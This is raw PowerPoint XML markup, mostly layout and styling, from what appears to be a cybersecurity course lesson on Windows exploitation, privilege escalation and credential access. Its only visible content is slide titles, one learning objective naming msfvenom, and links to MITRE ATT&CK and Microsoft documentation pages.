              <a:buSzPts val="1800"/>
              <a:buChar char="○"/>
              <a:defRPr/>
            </a:lvl5pPr>
            <a:lvl6pPr indent="-342900" lvl="5" marL="2743200">
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="■"/>
              <a:defRPr/>
            </a:lvl6pPr>
            <a:lvl7pPr indent="-342900" lvl="6" marL="3200400">
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
              <a:defRPr/>
            </a:lvl7pPr>
            <a:lvl8pPr indent="-342900" lvl="7" marL="3657600">
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="○"/>
              <a:defRPr/>
            </a:lvl8pPr>
            <a:lvl9pPr indent="-342900" lvl="8" marL="4114800">
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="■"/>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89" name="Shape 389"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="390" name="Google Shape;390;p56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="692300" y="1122950"/>
            <a:ext cx="8139900" cy="34458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391" name="Google Shape;391;p5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92" name="Google Shape;392;p56"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2"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Font typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2800"/>
              <a:buFont typeface="Roboto Light"/>
              <a:buNone/>
              <a:defRPr>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>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s Up slide 1">
  <p:cSld name="CUSTOM_10_2_1">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="F2F2F2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="393" name="Shape 393"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="394" name="Google Shape;394;p57"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="2688450"/>
            <a:ext cx="8520600" cy="75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2E5E73"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>Time’s up!</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="4000">
              <a:solidFill>
                <a:srgbClr val="2E5E73"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="ctr">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="4000">
                <a:solidFill>
                  <a:srgbClr val="2E5E73"/>
                </a:solidFill>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:rPr>
              <a:t>Let’s review</a:t>
            </a:r>
            <a:endParaRPr sz="4000">
              <a:solidFill>
                <a:srgbClr val="2E5E73"/>
              </a:solidFill>
              <a:latin typeface="Roboto Light"/>
              <a:ea typeface="Roboto Light"/>
              <a:cs typeface="Roboto Light"/>
              <a:sym typeface="Roboto Light"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="395" name="Google Shape;395;p57"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3975000" y="1536950"/>
            <a:ext cx="1194000" cy="1149065"/>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396" name="Shape 396"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="397" name="Google Shape;397;p58"/>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98" name="Google Shape;398;p58"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="311700" y="1152475"/>
            <a:ext cx="8520600" cy="3416400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:no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399" name="Google Shape;399;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End slide">
  <p:cSld name="CUSTOM_10_1_1_1_2_1_3">
    <p:bg>
      <p:bgPr>
        <a:solidFill>
          <a:srgbClr val="F2F2F2"/>
        </a:solidFill>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="400" name="Shape 400"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="401" name="Google Shape;401;p59"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="2938100"/>
            <a:ext cx="9144000" cy="75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2E5E73"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>The</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" sz="4000">
                <a:solidFill>
                  <a:srgbClr val="2E5E73"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr b="1" lang="en" sz="4000">
                <a:solidFill>
                  <a:srgbClr val="2E5E73"/>
                </a:solidFill>
                <a:latin typeface="Roboto"/>
                <a:ea typeface="Roboto"/>
                <a:cs typeface="Roboto"/>
                <a:sym typeface="Roboto"/>
              </a:rPr>
              <a:t>End</a:t>
            </a:r>
            <a:endParaRPr b="1" sz="4000">
              <a:solidFill>
                <a:srgbClr val="2E5E73"/>
              </a:solidFill>
              <a:latin typeface="Roboto"/>
              <a:ea typeface="Roboto"/>
              <a:cs typeface="Roboto"/>
              <a:sym typeface="Roboto"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="402" name="Google Shape;402;p59"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3731050" y="1119050"/>
            <a:ext cx="1681800" cy="16818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3" name="Google Shape;403;p59"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="4099875" y="1496700"/>
            <a:ext cx="1051550" cy="105155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theme" Target="../theme/theme1.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640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2600"/>
              <a:buFont typeface="Roboto"/>
              <a:buNone/>
              <a:defRPr b="1" i="0" sz="26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9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Google Shape;7;p1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="body"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457125" y="1143000"/>
            <a:ext cx="8229600" cy="3499500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln>
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr indent="-342900" lvl="0" marL="457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42900" lvl="1" marL="914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2pPr>
            <a:lvl3pPr indent="-342900" lvl="2" marL="1371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3pPr>
            <a:lvl4pPr indent="-342900" lvl="3" marL="1828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4pPr>
            <a:lvl5pPr indent="-342900" lvl="4" marL="22860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5pPr>
            <a:lvl6pPr indent="-342900" lvl="5" marL="2743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6pPr>
            <a:lvl7pPr indent="-342900" lvl="6" marL="3200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7pPr>
            <a:lvl8pPr indent="-342900" lvl="7" marL="3657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8pPr>
            <a:lvl9pPr indent="-342900" lvl="8" marL="4114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9pPr>
          </a:lstStyle>
          <a:p/>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Google Shape;8;p1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4572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1800"/>
              <a:buFont typeface="Roboto"/>
              <a:buNone/>
              <a:defRPr b="0" i="0" sz="18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Lst>
  <mc:AlternateContent>
    <mc:Choice Requires="p14">
      <p:transition p14:dur="400">
        <p:fade thruBlk="1"/>
      </p:transition>
    </mc:Choice>
    <mc:Fallback>
      <p:transition>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2878">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="5" orient="horz" pos="864">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="6" pos="576">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="7" pos="864">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="8" pos="1152">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="9" pos="1440">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="10" pos="1728">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="11" pos="2016">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="12" pos="2304">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="13" pos="2592">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="14" pos="2880">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="15" pos="3168">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="16" pos="3456">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="17" pos="3744">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="18" pos="4032">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="19" pos="4320">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="20" pos="4608">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="21" pos="4896">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="22" pos="5184">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="23" orient="horz" pos="584">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="24" orient="horz" pos="1152">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="25" orient="horz" pos="1440">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="26" orient="horz" pos="1731">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="27" orient="horz" pos="2018">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="28" orient="horz" pos="2305">
          <p15:clr>
            <a:srgbClr val="E46962"/>
          </p15:clr>
        </p15:guide>
        <p15:guide id="29" orient="horz" pos="2591">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xml"/><Relationship Id="rId3"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xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3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7.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image6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9.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image6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0.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image39.gif"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image4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2.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3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2.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image4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5.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image39.gi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0.xml"/><Relationship Id="rId3"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2.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image38.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image39.gi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3.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image48.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image39.gi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4.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3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6.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image4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8.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5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9.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image4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0.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image50.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image39.gi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1.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5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2.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5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3.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image55.png"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5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4.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://learn.microsoft.com/en-us/windows/win32/secauthz/access-tokens"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45.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image6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7.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5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8.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image6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57.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image6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58.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3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61.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image3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64.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5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66.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1037/001/" TargetMode="External"/><Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1543/003/" TargetMode="External"/><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1546/002/" TargetMode="External"/><Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1546/003/" TargetMode="External"/><Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1546/003/" TargetMode="External"/><Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1546/003/" TargetMode="External"/><Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1546/002/" TargetMode="External"/><Relationship Id="rId11" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image57.png"/><Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://attack.mitre.org/techniques/T1546/002/"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72.xml"/><Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="../media/image5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7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407" name="Shape 407"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="408" name="Google Shape;408;p60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="1694725"/>
            <a:ext cx="4909200" cy="12048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3500"/>
              <a:t>Windows Exploitation, Privilege Escalation,</a:t>
            </a:r>
            <a:endParaRPr sz="3500"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en" sz="3500"/>
              <a:t>and Credential Access</a:t>
            </a:r>
            <a:endParaRPr sz="3500"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="409" name="Google Shape;409;p60"/>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solidFill>
                  <a:srgbClr val="2E5E73"/>
                </a:solidFill>
                <a:latin typeface="Roboto Light"/>
                <a:ea typeface="Roboto Light"/>
                <a:cs typeface="Roboto Light"/>
                <a:sym typeface="Roboto Light"/>
              </a:rPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr>
              <a:solidFill>
                <a:srgbClr val="2E5E73"/>
              </a:solidFill>
              <a:latin typeface="Roboto Light"/>
              <a:ea typeface="Roboto Light"/>
              <a:cs typeface="Roboto Light"/>
              <a:sym typeface="Roboto Light"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="410" name="Google Shape;410;p60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="2" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="1249200"/>
            <a:ext cx="4557900" cy="244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Cybersecurity</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="411" name="Google Shape;411;p60"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="1" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4590900" y="3462900"/>
            <a:ext cx="4871400" cy="49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Lesson 16.2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61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="50" y="127400"/>
            <a:ext cx="9144000" cy="3936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a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Class </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Objectives</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="417" name="Google Shape;417;p61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="4294967295" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1287175" y="1174800"/>
            <a:ext cx="7204500" cy="393600"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Generate payloads using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:highlight>
                  <a:schemeClr val="dk2"/>
                </a:highlight>
              </a:rPr>
              <a:t>msfvenom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en">
                <a:solidFill>
                  <a:schemeClr val="dk2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:endParaRPr>
              <a:solidFill>
                <a:schemeClr val="dk2"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="418" name="Google Shape;418;p61"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:ph idx="3" type="subTitle"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1287175" y="1828788"/>
            <a:ext cx="5602200" cy="400200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchorCtr="0" anchor="t" bIns="91425" lIns="0" spcFirstLastPara="1" rIns="91425" wrap="square" tIns="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" lvl="0" marL="0" rtl="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
